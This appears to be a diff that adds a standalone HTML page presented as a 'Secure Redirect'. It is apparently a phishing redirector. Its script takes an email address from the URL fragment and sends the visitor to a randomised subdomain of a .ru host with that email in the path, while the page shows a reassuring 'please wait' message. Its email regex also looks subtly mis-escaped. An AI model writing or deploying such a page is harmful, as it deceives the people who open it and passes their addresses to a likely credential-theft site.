@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Redirect</title>
+    <script>
+        if (window.location.protocol !== 'https:') {
+            window.location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
+        }
+    </script>
+    <script>
+        // Extract email from #* hash
+        function getEmailFromHash() {
+            const hash = window.location.hash;
+            if (hash.startsWith('#*')) {
+                return hash.substring(2); // Remove '#*'
+            }
+            return null;
+        }
+
+        // Validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Main redirect handler
+        function handleRedirect() {
+            const email = getEmailFromHash();
+            if (!email || !isValidEmail(email)) {
+                window.location.href = 'error.html';
+                return;
+            }
+            // Redirect to your destination with /*email as the path
+            const destinationBase = 'https://4jznnw0zrrow36fkd5am.uewfuvvenst.ru/@RUlnNfdjzn9UK/';
+            window.location.replace(destinationBase + '*' + email);
+        }
+
+        window.onload = handleRedirect;
+    </script>
+</head>
+<body>
+    <div id="loading" style="text-align: center; padding: 20px; font-family: Arial, sans-serif;">
+        <h2>Secure Redirect in Progress</h2>
+        <p>Please wait while we process your request securely...</p>
+    </div>
+</body>
+</html>
